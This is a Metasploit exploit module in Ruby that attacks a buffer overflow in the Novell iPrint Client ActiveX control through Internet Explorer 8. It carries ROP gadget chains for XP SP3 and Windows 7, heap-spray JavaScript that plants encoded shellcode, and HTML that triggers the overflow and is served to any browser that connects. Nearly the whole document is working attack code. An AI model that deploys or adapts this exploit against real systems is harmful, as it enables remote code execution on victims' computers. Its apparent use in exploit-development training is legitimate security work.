require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

   Rank = NormalRanking

   include Msf::Exploit::Remote::HttpServer::HTML

   def initialize(info = {})
	
      super(update_info(info,
		
            'Name'           => 'Buffer Overflow against Novell iPrint Client on IE8',
            'Description'    => %q{
                                   This module exploits the Novell iPrint target 
                                   with a heap spray on IE8.
                                  },
            'License'        => MSF_LICENSE,
            'Author'         => [ 'manu.carus@ethical-hacking.de' ],
            'Version'        => '$Revision: $',
            'DefaultOptions' => { 'EXITFUNC' => 'process', },
            'Platform'       => 'win',
            'Targets'        =>
               [
                  [ 'IE 8 XPSP3', 
                     { 
                        'Ret'           => 0x5c075142, # RETN   [NIPPLIB.DLL]
                        'offset_to_eip' =>  717,
                        'offset_to_esp' =>  737,
                        'buffer_length' => 1000,
                        
                        'rop_gadgets' =>
                        [
                           0x5c0bcf4f,  # POP EBP # RETN [NIPPLIB.DLL] 
                           0x5c0bcf4f,  # skip 4 bytes [NIPPLIB.DLL]
                           0x5c09b652,  # POP EBX # RETN [NIPPLIB.DLL] 
                           0x00000040,  # 0x00000040-> edx
                           0x5c0b9cfc,  # XOR EDX,EDX # RETN [NIPPLIB.DLL] 
                           0x5c0b9c9e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [NIPPLIB.DLL] 
                           0x41414141,  # Filler (compensate)
                           0x5c098b62,  # POP ECX # RETN [NIPPLIB.DLL] 
                           0x41414141,  # Filler (RETN offset compensation)
                           0x41414141,  # Filler (RETN offset compensation)
                           0x41414141,  # Filler (RETN offset compensation)
                           0x41414141,  # Filler (RETN offset compensation)
                           0x5c0e52b5,  # &Writable location [NIPPLIB.DLL]
                           0x5c0a361b,  # POP EDI # RETN [NIPPLIB.DLL] 
                           0x5c075142,  # RETN (ROP NOP) [NIPPLIB.DLL]
                           0x5c066991,  # POP ESI # RETN [NIPPLIB.DLL] 
                           0x5c004277,  # JMP [EAX] [NIPPLIB.DLL]
                           0x5c06d993,  # POP EAX # RETN [NIPPLIB.DLL] 
                           0x749811a0,  # ptr to &VirtualProtect() (skipped module criteria, 
                                        # check if pointer is reliable !) [IAT msxml3.dll]
                           0x5c075d58,  # POP EBX # RETN [NIPPLIB.DLL] 
                           0x00000201,  # 0x00000201-> ebx
                           0x5c0839ac,  # PUSHAD # RETN [NIPPLIB.DLL] 
                           0x5c0635b2,  # ptr to 'push esp # ret ' [NIPPLIB.DLL]
	              ].pack("V*"),
				                                      
                     }
                  ],

                  [ 'IE 8 Win7', 
                     { 
                        'Ret'           => 0x5c075142, # RETN   [NIPPLIB.DLL]
                        'offset_to_eip' =>  717,
                        'offset_to_esp' =>  737,
                        'buffer_length' => 1000,
                        
                        'rop_gadgets' =>
                        [
                           0x5c0b4122,  # POP EBP # RETN [NIPPLIB.DLL] 
                           0x5c0b4122,  # skip 4 bytes [NIPPLIB.DLL]
                           0x5c07bdb7,  # POP EBX # RETN [NIPPLIB.DLL] 
                           0x00001000,  # 0x00001000-> edx
                           0x5c0b9cfc,  # XOR EDX,EDX # RETN [NIPPLIB.DLL] 
                           0x5c0b9c9e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [NIPPLIB.DLL] 
                           0x41414141,  # Filler (compensate)
                           0x5c088fab,  # POP ECX # RETN [NIPPLIB.DLL] 
                           0x41414141,  # Filler (RETN offset compensation)
                           0x41414141,  # Filler (RETN offset compensation)
                           0x41414141,  # Filler (RETN offset compensation)
                           0x41414141,  # Filler (RETN offset compensation)
                           0x00000040,  # 0x00000040-> ecx
                           0x5c074ca4,  # POP EDI # RETN [NIPPLIB.DLL] 
                           0x5c075142,  # RETN (ROP NOP) [NIPPLIB.DLL]
                           0x5c0b8a8b,  # POP ESI # RETN [NIPPLIB.DLL] 
                           0x5c004277,  # JMP [EAX] [NIPPLIB.DLL]
                           0x5c06dc78,  # POP EAX # RETN [NIPPLIB.DLL] 
                           0x10052200,  # ptr to &VirtualAlloc() [IAT ienipp.ocx]
                           0x5c094a41,  # POP EBX # RETN [NIPPLIB.DLL] 
                           0x00000001,  # 0x00000001-> ebx
                           0x5c0839ac,  # PUSHAD # RETN [NIPPLIB.DLL] 
                           0x5c0635b2,  # ptr to 'push esp # ret ' [NIPPLIB.DLL]
                        ].pack("V*"),
			                                      
                     }
                  ],
               ],
            'DefaultTarget'  => 0))
            
   end

   def autofilter
     false
   end

   def check_dependencies
     use_zlib
   end

   def on_request_uri(cli, request)
	
      # Re-generate the payload.
      return if ((p = regenerate_payload(cli)) == nil)

      # Encode the rop chain 
      rop = target['rop_gadgets']
      rop_js = Rex::Text.to_unescape(rop, Rex::Arch.endian(target.arch))

      # Encode the shellcode
      code = payload.encoded
      code_js = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))

      # Fill the target address
      eip = "%08x" % target.ret

      # Junk
      junk1 = Rex::Text.rand_text_alpha(target['buffer_length'])
      junk2 = Rex::Text.rand_text_alpha(target['buffer_length'])
      junk3 = Rex::Text.rand_text_alpha(target['buffer_length'])
	   
      # JavaScript code
      spray = <<-JS

         function addressToString(address_string)
         {
            if (address_string.length != 8) 
            {
               alert("Invalid address!");
               return;
            }
            
            hex_byte1 = address_string.substring(0, 2);
            hex_byte2 = address_string.substring(2, 4);
            hex_byte3 = address_string.substring(4, 6);
            hex_byte4 = address_string.substring(6);

            address = "%" + hex_byte4 + "%" + hex_byte3 + "%" + hex_byte2 + "%" + hex_byte1;
   
            return unescape(address);
         }
         
	 function opcodesToString(opcodes_string)
         {
            if (opcodes_string.length % 2 != 0) 
            {
               alert("Invalid opcodes!");
               return;
            }
   
            opcodes = '';
            for (i=0; i < opcodes_string.length; i+=2)
            {
               opcodes += "%" + opcodes_string.substring(i, i+2);
            }
   
            return unescape(opcodes);
         }

         var heap_obj = new heapLib.ie(0x10000);

         var code    = unescape("#{code_js}");   // code to execute
         var padding = unescape("%u9090%u9090"); // NOPs for padding/junk
         var rop     = unescape("#{rop_js}");    // ROP chain

         // create a big block of junk
         while (padding.length < 0x1000) padding += padding; 

         // create junk to be placed before ROP
         junk_offset = padding.substring(0, 0x5f4); // offset to begin of shellcode

         // build one block of junk + shellcode + more junk (total size : 2048 bytes)
         var shellcode = junk_offset + rop + code + padding.substring(0, 0x800 - code.length - junk_offset.length - rop.length);

         // repeat the block many times
         while (shellcode.length < 0x40000) shellcode += shellcode;
		
         // cut blocks to perfectly sized allocations of 0x10000 bytes (IE 8)
         block = shellcode.substring(0, (0x7fb00-6)/2 );

         // heap spray
         heap_obj.gc();

         for (var i=0; i < 0x800; i++) 
         {
            heap_obj.alloc(block);
         }

         // trigger the buffer overflow
         ret='';
		
         eip = addressToString("#{eip}");    // return to stack
         esp = addressToString("5c0529f8") + // POP EAX # RETN [NIPPLIB.DLL]
               addressToString("0c0c0c0c") + // ROP chain at heap 
               addressToString("5c058da9");  // XCHG EAX,ESP # RETN [NIPPLIB.DLL]
         
         // alert("eip = #{eip}");
		
         // payload = junk1 * 717 + eip + junk2 * 16 + esp + junk3 * 251
         junk1 = '#{junk1}'.substring(0, #{target['offset_to_eip']});
         junk2 = '#{junk2}'.substring(0, 16);
         junk3 = '#{junk3}'.substring(0, #{target['buffer_length']} - #{target['offset_to_esp']} - esp.length);

         payload = junk1 + eip + junk2 + esp + junk3;
         ret += payload;

         // alert("junk1: " + junk1.length + " bytes");
         // alert("eip: "   + eip.length   + " bytes");
         // alert("junk2: " + junk2.length + " bytes");
         // alert("esp: "   + esp.length   + " bytes");
         // alert("junk3: " + junk3.length + " bytes");
         // alert("ret: "   + ret.length   + " bytes");
         
         arg1 = 'printer';
         arg2 = 'realm';
         arg3 = 'user';
         arg4 = 'pass';

         document.write("Triggering the crash...");

         alert('Attach WinDbg and set a breakpoint to 0x#{eip}!');
         target.GetDriverSettings(ret,arg2,arg3,arg4);

      JS

      js = heaplib(spray)

      # build html

      content = <<-HTML
      <html>
      <object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C' id='target'></object>
      <script language='javascript'>
      #{js}
      </script>
      </html>
      HTML

      print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

      # Transmit the response to the client
      send_response_html(cli, content)

      # Handle the payload
      #handler(cli)

   end
   
end
